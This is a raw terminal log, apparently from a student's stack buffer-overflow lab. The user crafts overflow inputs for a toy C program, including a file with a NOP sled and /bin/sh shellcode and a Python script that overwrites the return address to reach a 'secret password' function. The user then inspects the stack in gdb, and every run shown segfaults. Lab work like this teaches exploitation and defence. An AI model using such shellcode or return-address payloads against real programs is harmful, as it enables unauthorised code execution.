[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"input1.txt" [converted] 1L, 214C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[34m<90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><900[2;1H><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><99[3;1H0><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><<[4;1H90><90><90><90><90>[m1Ã€[34m<89>[mÃƒÂ°[4;28H[34m^W[mÃ[34m<80>[m1Ã’Rhn/shh//bi[34m<89>[mÃ£RS[34m<89>[mÃ¡[4;60H[34m<8d>[mB[34m^K[mÃ[34m<80>[mAAAAAAAAA[5;1HAAAAAAAAAAAAAAAAAAAAAAAA[34m^P[mÃ¶Ã¿Â¿[6;1H[94m~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H[38;5;81m<90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><900[2;1H><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><99[3;1H0><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><<[4;1H90><90><90><90><90>[m1Ã€[38;5;81m<89>[mÃƒÂ°[4;28H[38;5;81m^W[mÃ[38;5;81m<80>[m1Ã’Rhn/shh//bi[38;5;81m<89>[mÃ£RS[38;5;81m<89>[mÃ¡[4;60H[38;5;81m<8d>[mB[38;5;81m^K[mÃ[38;5;81m<80>[mAAAAAAAAA[5;1HAAAAAAAAAAAAAAAAAAAAAAAA[38;5;81m^P[mÃ¶Ã¿Â¿[6;1H[94m~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll"input1.txt" [converted] 1L, 214C[1;1H[?25h[?25l[24;52H^[[1;1H[24;52H  [1;1H[24;52H^[[1;1H[24;52H  [1;1H[?25h[?25l[24;52H:[1;1H[24;1H[K[24;1H:[?2004h[?25hq[?25l[?25h![?25l[?25h[?25l[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 < A2
Not good
Segmentation fault
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ G[Kgdb @#[K[K#[Kmidex2
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) list
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) 
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
19	}
(gdb) break 15
Breakpoint 1 at 0x8049219: file midex2.c, line 15.
(gdb) run < A2
Starting program: /home/user01/midex2 < A2

Breakpoint 1, main1 () at midex2.c:15
15		func1();
(gdb) X/4[K[K[Kx/40x $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x91c14141	0x08000804
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) wqa[K[K[Kquit
A debugging session is active.

	Inferior 1 [process 4226] will be killed.

Quit anyway? (y or n) y
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi genA[K[K[K[KA2
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"A2" 1L, 109C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAAAQ[34m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,32[10CAll[1;32H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAAAQ[38;5;81m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,32[10CAll"A2" 1L, 109C[1;32H[?25h[?25l[24;52HI[1;32H[24;52H [1;1H[24;1H[1m-- INSERT --[m[24;13H[K[24;62H1,1[11CAll[1;1H[?25h[?25l[24;64H2[1;2H[?25h[?25l[77CAA[2;1HA[23CQ[38;5;81m^D^H[m[2;30H[K[24;64H1[1;1H[?25h[?25l[24;64H2[1;2H[?25h[?25l[77CAA[2;1HA[22CQ[38;5;81m^D^H[m[2;29H[K[24;64H1[1;1H[?25h[24;1H[K[1;1H[?25l[24;52H^[[1;1H[24;52H  [1;1H[24;62H1,1[11CAll[1;1H[?25h[?25l[24;52H:[1;1H[24;52H[K[24;1H:[?2004h[?25hQ[?25l[?25h![?25l[?25h[?25l[97m[41mE492: Not an editor command: Q![1;1H[m[24;62H1,1[11CAll[1;1H[?25h[?25l[24;52H^[[1;1H[24;52H  [1;1H[24;52H^[[1;1H[24;52H  [1;1H[?25h[?25l[24;52H:[1;1H[24;1H[K[24;1H:[?2004h[?25hQ[?25l[?25h[?25l[24;2H[K[24;2H[?25hQ[?25l[?25h![?25l[?25h[?25l[97m[41mE492: Not an editor command: Q![1;1H[m[24;62H1,1[11CAll[1;1H[?25h[?25l[24;52H^[[1;1H[24;52H  [1;1H[24;52H^[[1;1H[24;52H  [1;1H[?25h[?25l[24;52H:[1;1H[24;1H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25h[?25l[?1006l[?1002l[?2004l"A2" 1L, 107C written[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t
[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi A2gdb midex2./midex2 < A2
Not good
Segmentation fault
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ !v[K[Kgdb [K[K[K[K!g
gdb midex2
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) break 15
Breakpoint 1 at 0x8049219: file midex2.c, line 15.
(gdb) list
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) 
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
19	}
(gdb) b[Krun < A2
Starting program: /home/user01/midex2 < A2

Breakpoint 1, main1 () at midex2.c:15
15		func1();
(gdb) X/[K[Kx/40x $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) info register
eax            0x1	1
ecx            0x1	1
edx            0xb7fae89c	-1208293220
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049219	0x8049219 <main1+41>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) start[K[K[K[K[Kprint func2
$1 = {int ()} 0x80491c1 <func2>
(gdb) next
Not good
16	}
(gdb) x/40 $exp[K[K[K[K[K[K[Kx40 $esp
A syntax error in expression, near `$esp'.
(gdb) x/x40 $esp[1P[C[Cx $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) next

Program received signal SIGSEGV, Segmentation fault.
0x08049200 in main1 () at midex2.c:12
12	void main1(){
(gdb) next

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) next
The program is not being run.
(gdb) ru[K[Krun[K[K[Klist
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
14		scanf("%s", buffer);
15		func1();
16	}
(gdb) break 12
Breakpoint 2 at 0x8049201: file midex2.c, line 12.
(gdb) run <> [K[K A2
Starting program: /home/user01/midex2 < A2

Breakpoint 2, main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) NEXT[K[K[K[Knext

Breakpoint 1, main1 () at midex2.c:15
15		func1();
(gdb) next[K[K[K[K$esp[K[K[K[Kx/40x$[K $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) next
Not good
16	}
(gdb) info register
eax            0xffffffff	-1
ecx            0x804e170	134537584
edx            0xb7fae890	-1208293232
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x804921e	0x804921e <main1+46>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) next

Program received signal SIGSEGV, Segmentation fault.
0x08049202 in main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) next

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) list
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
(gdb) 
19	}
(gdb) print func1
$2 = {int ()} 0x8049192 <func1>
(gdb) run[K[K[Krun[K[K[Krun
Starting program: /home/user01/midex2 < A2

Breakpoint 2, main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) a
Ambiguous command "a": actions, add-auto-load-safe-path, add-auto-load-scripts-directory, add-inferior...
(gdb) /x[K[Kx/40x $esp
0xbffff6c0:	0x00000000	0x00c30000	0x00000000	0xb7fff000
0xbffff6d0:	0x00000000	0x00000000	0x00000000	0x45d87d00
0xbffff6e0:	0x0000000b	0xbffff8e0	0xb7e07d09	0xb7fb0808
0xbffff6f0:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
0xbffff700:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
0xbffff710:	0x00000001	0xbffff7d4	0xbffff7dc	0x08049261
0xbffff720:	0xb7fe6f60	0x00000000	0xbffff738	0x08049239
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) next

Breakpoint 1, main1 () at midex2.c:15
15		func1();
(gdb) nextx/40x $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) x/40x $esp[C[C[C[C[C[C[6Pnextx/40x $esp[C[C[C[C[C[Ca[Krunprint func1
$3 = {int ()} 0x8049192 <func1>
(gdb) print func1[C[C[C[C[C[C[1Px/40x $esp[C[C[C[C[C[C[6Pnextx/40x $esp[C[C[C[C[C[Ca[Krunprint func1[C[C[C[C[C[C[7Plistnextinfo register[C[C[C[C[C[Cnext[Kx/40x $esp[C[C[C[C[C[C[6Pnextrun < A2[C[C[C[C[C[Cbreak 12[C[C[C[C[C[C[4Plistnextlistbreak 12[C[C[C[C[C[Crun < A2[C[C[C[C[C[C[4Pnextx/40x $esp[C[C[C[C[C[C[6Pnextinfo register[C[C[C[C[C[Cnext[Klistprint func1[C[C[C[C[C[Crun[Kprint func1[K2
$4 = {int ()} 0x80491c1 <func2>
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4262] will be killed.

Quit anyway? (y or n) y
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi genA2.py 
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"genA2.py" 4L, 86C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[34m#!/usr/bin/python[m
padding = [31m'A'[m * [31m104[m
eip = [31m'[m[35m\xc1\x91\x04\x08[m[31m'[m
[36mprint[m   padding + eip
[94m~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H4,22[10CAll[4;22H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H[96m#!/usr/bin/python[m
padding = [95m'A'[m * [95m104[m
eip = [95m'[m[38;5;224m\xc1\x91\x04\x08[m[95m'[m
[1m[96mprint[m   padding + eip
[94m~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H4,22[10CAll"genA2.py" 4L, 86C[4;22H[?25h[?25l[24;52H^[[4;22H[24;52H  [4;22H[24;52H^[[4;22H[24;52H  [4;22H[?25h[?25l[24;52H:[4;22H[24;1H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25ha[?25l[?25h[?25l[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./ [Kmidex2 < A2
Not good
Segmentation fault
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ HEXE[K[K[K[Khexde[K[Kedit A2
bash: hexedit: command not found
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ GDB [K[K[K[Kgd b[K[Kb midex2 
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) list
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) 
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
19	}
(gdb) break 14
Breakpoint 1 at 0x8049201: file midex2.c, line 14.
(gdb) run $[K< A2
Starting program: /home/user01/midex2 < A2

Breakpoint 1, main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) x/40 x[K[Kx $esp
0xbffff6c0:	0x00000000	0x00c30000	0x00000000	0xb7fff000
0xbffff6d0:	0x00000000	0x00000000	0x00000000	0x0c7c7600
0xbffff6e0:	0x0000000b	0xbffff8e0	0xb7e07d09	0xb7fb0808
0xbffff6f0:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
0xbffff700:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
0xbffff710:	0x00000001	0xbffff7d4	0xbffff7dc	0x08049261
0xbffff720:	0xb7fe6f60	0x00000000	0xbffff738	0x08049239
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) next[K[K[K[Kinfo register
eax            0x804c000	134529024
ecx            0x549d426	88724518
edx            0xbffff764	-1073744028
ebx            0x0	0
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049201	0x8049201 <main1+17>
eflags         0x216	[ PF AF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) next
15		func1();
(gdb) nextinfo register
eax            0x1	1
ecx            0x1	1
edx            0xb7fae89c	-1208293220
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049219	0x8049219 <main1+41>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) info register[C[C[C[C[C[Cnext[Kinfo register[C[C[C[C[C[C[3Px/40x $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) next
Not good
16	}
(gdb) nextx/40x $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) x/40x $esp[C[C[C[C[C[C[6Pnextx/40x $esp[C[C[C[C[C[Cinfo register
eax            0xffffffff	-1
ecx            0x804e170	134537584
edx            0xb7fae890	-1208293232
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x804921e	0x804921e <main1+46>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) next

Program received signal SIGSEGV, Segmentation fault.
0x08049202 in main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) next

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) list
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
(gdb) 
19	}
(gdb) break 12
Note: breakpoint 1 also set at pc 0x8049201.
Breakpoint 2 at 0x8049201: file midex2.c, line 12.
(gdb) run < A2
Starting program: /home/user01/midex2 < A2

Breakpoint 1, main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) N[Kx/40[K[K[K[Ksho[K[K[Kinfo register
eax            0x804c000	134529024
ecx            0x14017952	335640914
edx            0xbffff764	-1073744028
ebx            0x0	0
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049201	0x8049201 <main1+17>
eflags         0x216	[ PF AF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) info register[C[C[C[C[C[C[5Prun < A2[C[C[C[C[C[Cbreak 12[C[C[C[C[C[C[4Plistnextlistbreak 12[C[C[C[C[C[Crun < A2[C[C[C[C[C[Cinfo register[C[C[C[C[C[C[Kx/40x %[K$esp
0xbffff6c0:	0x00000000	0x00c30000	0x00000000	0xb7fff000
0xbffff6d0:	0x00000000	0x00000000	0x00000000	0x631c9100
0xbffff6e0:	0x0000000b	0xbffff8e0	0xb7e07d09	0xb7fb0808
0xbffff6f0:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
0xbffff700:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
0xbffff710:	0x00000001	0xbffff7d4	0xbffff7dc	0x08049261
0xbffff720:	0xb7fe6f60	0x00000000	0xbffff738	0x08049239
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) next
15		func1();
(gdb) nextx/40x $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) x/40x $esp[C[C[C[C[C[C[6Pnextx/40x $esp[C[C[C[C[C[Cinfo register
eax            0x1	1
ecx            0x1	1
edx            0xb7fae89c	-1208293220
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049219	0x8049219 <main1+41>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4319] will be killed.

Quit anyway? (y or n) y
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gdb midex2
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
